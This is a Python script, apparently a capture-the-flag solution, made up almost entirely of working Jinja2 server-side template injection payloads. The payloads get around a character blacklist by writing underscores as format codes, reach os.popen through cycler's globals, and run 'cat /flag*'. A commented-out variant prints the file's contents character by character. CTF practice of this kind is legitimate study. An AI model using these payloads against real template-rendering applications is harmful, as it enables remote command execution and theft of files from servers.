from hashlib import sha256
from jinja2 import Template

if __name__ == "__main__":
    """
    template = R'''
{%- for char in cycler
  |attr(("%c" % (95,)) * 2 + "init" + ("%c" % (95,)) * 2)
  |attr(("%c" % (95,)) * 2 + "globals" + ("%c" % (95,)) * 2)
  |items|selectattr("0", "equalto", "os")|first|last|attr("popen")("cat /flag" + ("%c" % (46,)) + "tXt"|attr("lower")())|attr("read")() -%}
  {%- if char == '0' -%}0
  {%- elif char == '1' -%}1
  {%- elif char == '2' -%}2
  {%- elif char == '3' -%}3
  {%- elif char == '4' -%}4
  {%- elif char == '5' -%}5
  {%- elif char == '6' -%}6
  {%- elif char == '7' -%}7
  {%- elif char == '8' -%}8
  {%- elif char == '9' -%}9
  {%- elif char == 'a' -%}a
  {%- elif char == 'b' -%}b
  {%- elif char == 'c' -%}c
  {%- elif char == 'd' -%}d
  {%- elif char == 'e' -%}e
  {%- elif char == 'f' -%}f
  {%- elif char == 'g' -%}g
  {%- elif char == 'h' -%}h
  {%- elif char == 'i' -%}i
  {%- elif char == 'j' -%}j
  {%- elif char == 'k' -%}k
  {%- elif char == 'l' -%}l
  {%- elif char == 'm' -%}m
  {%- elif char == 'n' -%}n
  {%- elif char == 'o' -%}o
  {%- elif char == 'p' -%}p
  {%- elif char == 'q' -%}q
  {%- elif char == 'r' -%}r
  {%- elif char == 's' -%}s
  {%- elif char == 't' -%}t
  {%- elif char == 'u' -%}u
  {%- elif char == 'v' -%}v
  {%- elif char == 'w' -%}w
  {%- elif char == 'y' -%}y
  {%- elif char == 'z' -%}z
  {%- elif char == 'A' -%}A
  {%- elif char == 'B' -%}B
  {%- elif char == 'C' -%}C
  {%- elif char == 'D' -%}D
  {%- elif char == 'E' -%}E
  {%- elif char == 'F' -%}F
  {%- elif char == 'G' -%}G
  {%- elif char == 'H' -%}H
  {%- elif char == 'I' -%}I
  {%- elif char == 'J' -%}J
  {%- elif char == 'K' -%}K
  {%- elif char == 'L' -%}L
  {%- elif char == 'M' -%}M
  {%- elif char == 'N' -%}N
  {%- elif char == 'O' -%}O
  {%- elif char == 'P' -%}P
  {%- elif char == 'Q' -%}Q
  {%- elif char == 'R' -%}R
  {%- elif char == 'S' -%}S
  {%- elif char == 'T' -%}T
  {%- elif char == 'U' -%}U
  {%- elif char == 'V' -%}V
  {%- elif char == 'W' -%}W
  {%- elif char == 'X' -%}X
  {%- elif char == 'Y' -%}Y
  {%- elif char == 'Z' -%}Z
  {%- elif char == '!' -%}!
  {%- elif char == '"' -%}"
  {%- elif char == '#' -%}#
  {%- elif char == '$' -%}$
  {%- elif char == '%' -%}%
  {%- elif char == '&' -%}&
  {%- elif char == "'" -%}'
  {%- elif char == '(' -%}(
  {%- elif char == ')' -%})
  {%- elif char == '*' -%}*
  {%- elif char == '+' -%}+
  {%- elif char == ',' -%},
  {%- elif char == '-' -%}-
  {%- elif char == '/' -%}/
  {%- elif char == ':' -%}:
  {%- elif char == ';' -%};
  {%- elif char == '<' -%}<
  {%- elif char == '=' -%}=
  {%- elif char == '>' -%}>
  {%- elif char == '?' -%}?
  {%- elif char == '@' -%}@
  {%- elif char == '^' -%}^
  {%- elif char == '`' -%}`
  {%- elif char == '{' -%}&#123;
  {%- elif char == '|' -%}|
  {%- elif char == '}' -%}&#125;
  {%- elif char == '~' -%}~
  {%- elif char == ' ' %} {% else -%}?
  {%- endif -%}
{%- endfor -%}
'''.strip()
"""
    template = R"""
{%for a in cycler|attr("%c%cinit%c%c"%((95,)*4))|attr("%c%cglobals%c%c"%((95,)*4))|items|selectattr("0","equalto","os")|first|last|attr("popen")("cat /flag*")|attr("read")()|attr("strip")()%}{%if a=="b"%}1{%else%}0{%endif%}{%endfor%}
""".strip()
    print(sha256(("admin" + template).encode()).hexdigest())
    for invalid in ("{{", "}}", ".", "_", "[", "]", "\\", "x"):
        if invalid in template:
            raise ValueError(invalid)
    print(Template(template).render())
